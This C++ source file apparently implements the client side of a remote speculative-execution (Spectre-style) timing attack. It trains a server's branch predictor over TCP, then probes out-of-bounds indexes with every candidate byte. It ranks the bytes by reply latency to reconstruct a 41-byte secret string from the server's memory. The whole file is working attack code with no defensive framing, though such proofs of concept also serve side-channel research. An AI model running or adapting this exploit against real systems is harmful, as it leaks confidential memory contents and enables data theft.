#include <boost/asio.hpp>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <random>
#include <sched.h>
#include <x86intrin.h>

using boost::asio::ip::tcp;

/********************************************************************
Analysis code
********************************************************************/

// std::vector<int64_t> samples;
/*
struct Results {
  int64_t median;
  int64_t average;
  double stdev;
};

Results computeResults(int64_t numSamples) {
  size_t n = samples.size() / 2;
  std::nth_element(samples.begin(), samples.begin() + n, samples.end());

  auto total = std::accumulate(samples.begin(), samples.end(), 0ll);
  auto mean = total / numSamples;

  std::vector<double> diff(numSamples);
  std::transform(samples.begin(), samples.end(), diff.begin(),
                 [mean](double x) { return x - mean; });
  double sq_sum =
      std::inner_product(diff.begin(), diff.end(), diff.begin(), 0.0);
  double stdev = std::sqrt(sq_sum / numSamples);

  return {samples[n], mean, stdev};
}
*/

std::array<uint8_t, 256> byteTestedOrder;

char getRemoteResult(tcp::socket &s, uint64_t samplePoint, size_t waitTime,
                     int64_t numSamples) {
  std::random_device random{};
  std::mt19937 genRand{random()};

  auto scores = std::array<uint32_t, 256>();
  for (auto &score : scores) {
    score = 0;
  }

  int candidate1;
  int candidate2;

  for (int sample = 0; sample < numSamples; sample++) {
    std::shuffle(std::begin(byteTestedOrder), std::end(byteTestedOrder),
                 genRand);
    for (int byteTested : byteTestedOrder) {
      auto localTimes = uint32_t{};
      // train the branch predictor
      struct {
        uint64_t a;
        uint64_t b;
      } data;
      int64_t totalTraining = (genRand() % 2) + 10;
      for (int i = 0; i < totalTraining; i++) {
        data.a = 0;
        data.b = genRand() % 256;
        boost::asio::write(s, boost::asio::buffer(&data, sizeof(data)));
        boost::asio::read(s,
                          boost::asio::buffer(&localTimes, sizeof(localTimes)));
      }

      // attack
      /*std::chrono::high_resolution_clock::time_point start, end;
      start = std::chrono::high_resolution_clock::now();*/
      data.a = samplePoint;
      data.b = byteTested;
      boost::asio::write(s, boost::asio::buffer(&data, sizeof(data)));
      boost::asio::read(s,
                        boost::asio::buffer(&localTimes, sizeof(localTimes)));
      // end = std::chrono::high_resolution_clock::now();
      // samples[sample] = reply;

      /*if (byteTested == 'f') {
        std::cout << "F: " << localTimes << "\n";
      }*/
      if (localTimes < 120) {
        scores[byteTested] += 1;
      }
      // std::this_thread::sleep_for(std::chrono::milliseconds(waitTime));
    }

    candidate1 = -1;
    candidate2 = -1;
    for (int i = 0; i < scores.size(); i++) {
      if (candidate1 < 0 || scores[i] >= scores[candidate1]) {
        candidate2 = candidate1;
        candidate1 = i;
      } else if (candidate2 < 0 || scores[i] >= scores[candidate2]) {
        candidate2 = i;
      }
    }

    if (scores[candidate1] > 0 &&
        scores[candidate1] >= scores[candidate2] + 10) {
      break;
    }
  }

  std::cout << "Best guess: " << char(candidate1) << " (" << candidate1 << " "
            << scores[candidate1] << ")";

  if (scores[candidate2] > 0) {
    std::cout << " Runner-up: " << char(candidate2) << " (" << candidate2 << " "
              << scores[candidate2] << ")\n";
  } else {
    std::cout << "\n";
  }

  return candidate1;
}

int main(int argc, char *argv[]) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(2, &mask);
  int status = sched_setaffinity(0, sizeof(mask), &mask);
  if (status)
    throw std::runtime_error("sched_affinity");

  try {
    if (argc != 5) {
      std::cerr << "Usage: blocking_tcp_echo_client <host> <port> "
                   "<wait time> <num samples>\n";
      return 1;
    }

    boost::asio::io_context io_context;

    for (int i = 0; i < 256; ++i) {
      byteTestedOrder[i] = i;
    }

    tcp::socket s(io_context);
    tcp::resolver resolver(io_context);
    boost::asio::connect(s, resolver.resolve(argv[1], argv[2]));
    auto waitTime = std::stoi(argv[3]);
    auto numSamples = std::stoi(argv[4]);

    // samples.resize(numSamples);

    /*
    Results results = getRemoteResults(s, 0, waitTime, numSamples);
    Results results2 = getRemoteResults(s, 255, waitTime, numSamples);

    std::cout << "When AVX2 is engaged:\n";
    std::cout << "[median] " << results.median << "\n";
    std::cout << "[average] " << results.average << "\n";
    std::cout << "[stdev] " << results.stdev << "\n";

    std::cout << "When AVX2 is not engaged:\n";
    std::cout << "[median] " << results2.median << "\n";
    std::cout << "[average] " << results2.average << "\n";
    std::cout << "[stdev] " << results2.stdev << "\n";

    std::cout << "[median] Difference: " << results.median - results2.median
              << "\n";
    std::cout << "[average] Difference: " << results.average - results2.average
              << "\n";
    */

    std::string result;
    // Numbers chosen so we only look at the secret string
    for (uint64_t i = 160u; i < 160u + 41; i++) {
      result.push_back(getRemoteResult(s, i, waitTime, numSamples));
    }
    std::cout << "Result: " << result << "\n";

  } catch (std::exception &e) {
    std::cerr << "Exception: " << e.what() << "\n";
  }

  return 0;
}
